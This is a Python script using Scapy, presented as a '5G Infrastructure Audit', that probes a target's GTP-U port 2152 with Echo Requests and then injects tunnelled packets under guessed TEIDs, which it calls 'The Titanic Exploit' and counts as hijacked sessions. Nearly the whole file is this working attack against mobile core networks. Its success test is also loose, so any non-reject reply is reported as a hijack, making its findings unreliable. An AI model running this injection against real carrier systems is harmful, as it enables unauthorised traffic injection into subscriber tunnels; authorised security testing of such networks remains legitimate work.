#!/usr/bin/env python3
import sys
import time
import random
from scapy.all import *

# Load GTP contribution if available, otherwise define manually
try:
    from scapy.contrib.gtp import GTP_U_Header, GTPHeader, GTPProbe
except ImportError:
    # Basic definitions if contrib missing (fallback)
    # Note: Modern scapy usually has this. 
    # Logic: 0x32 = GTP v1-U, 0x30 = GTP v1-C
    pass

from rich.console import Console
from rich.panel import Panel
from rich.progress import Progress, SpinnerColumn, TextColumn

console = Console()

class GTPAuditor:
    def __init__(self, target):
        self.target = target
        self.open_gtp = False
        self.valid_teids = []
        
    def check_gtp_port(self):
        """
        Phase 1: The 'Titanic' Check. 
        Is UDP 2152 open and responding to Echo Requests?
        """
        console.print(f"[bold]Checking GTP-U exposure on {self.target}:2152...[/bold]")
        
        # Craft GTP Echo Request (Type 1)
        # GTP v1 Header: version=1, protocol_type=1 (GTP), flags=0
        # Msg Type 1 = Echo Request
        # TEID = 0 (Control Plane / No context)
        
        # Note: We use raw bytes if contrib fails, but let's assume Scapy standard first.
        # Fallback raw construction: 
        # Flags: 0x30 (Ver 1, PT 1), Type: 0x01 (Echo), Length: 0x0000, TEID: 0x00000000
        packet = IP(dst=self.target)/UDP(sport=random.randint(2000,60000), dport=2152)/Raw(load=b'\x30\x01\x00\x00\x00\x00\x00\x00')
        
        answered = sr1(packet, timeout=2, verbose=0)
        
        if answered:
            # Check if it's a GTP Echo Response (Type 2)
            payload = bytes(answered[UDP].payload)
            if payload[0] == 0x30 and payload[1] == 0x02:
                console.print(Panel(f"[red]CRITICAL: GTP-U PORT 2152 EXPOSED![/red]\nTarget replied to Echo Request.\nSource IPs are visible to the public internet.", title="VULNERABILITY DETECTED", border_style="red"))
                self.open_gtp = True
                return True
            else:
                console.print(f"[yellow]Port 2152 open, but received non-GTP response: {payload.hex()}[/yellow]")
        else:
            console.print("[green]No response on port 2152 (Filtered/Closed).[/green]")
            
        return False

    def teid_fuzzing(self):
        """
        Phase 2: TEID Enumeration (Context hijacking validation)
        """
        if not self.open_gtp:
            return # Skip if port is closed
            
        console.print("\n[bold cyan]── PHASE 2: TEID FUZZING (The 'Titanic' Exploit) ──[/bold cyan]")
        
        # Try common TEIDs
        teids = [0x00000000, 0x00000001, 0x00000100, 0x12345678, random.randint(1, 0xFFFFFFFF)]
        
        for teid in teids:
            # Construct a T-PDU (Type 255) with the TEID
            # Payload: Simple ICMP Echo inside the tunnel
            # GTP Header: Val 0x30, Type 0xFF (255 - T-PDU), Length...
            
            # Scapy raw construction for reliability:
            # Flags(1B) + Type(1B) + Len(2B) + TEID(4B)
            # Length = 20 bytes (IP header) + 8 bytes (ICMP) = 28 bytes = 0x001C
            header = b'\x30\xff\x00\x1c' + teid.to_bytes(4, 'big')
            
            # Inner IP Packet (The payload inside the tunnel)
            inner_pkt = IP(dst="8.8.8.8")/ICMP()
            
            full_pkt = IP(dst=self.target)/UDP(dport=2152)/Raw(load=header + bytes(inner_pkt))
            
            console.print(f"Testing TEID: {hex(teid)}...")
            resp = sr1(full_pkt, timeout=1, verbose=0)
            
            if resp:
                if ICMP in resp and resp[ICMP].type == 3: # Dest Unreachable
                    console.print(f"[yellow]TEID {hex(teid)} -> Reject (Session not found)[/yellow]")
                else:
                    console.print(f"[red]TEID {hex(teid)} -> RESPONSE RECEIVED! (Valid Session Hijacked)[/red]")
                    self.valid_teids.append(teid)

    def run(self):
        console.print(Panel(f"Running 5G Infrastructure Audit against {self.target}", title="OSI 5G SENTINEL", border_style="blue"))
        if self.check_gtp_port():
            self.teid_fuzzing()
            if self.valid_teids:
                return f"CRITICAL: Found {len(self.valid_teids)} exposed GTP-U sessions!"
            return "HIGH: UDP 2152 Open, but no sessions hijacked."
        return "SAFE: P2152 Closed."

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Usage: python3 osi_5g.py <target_ip>")
        sys.exit(1)
    
    auditor = GTPAuditor(sys.argv[1])
    auditor.run()
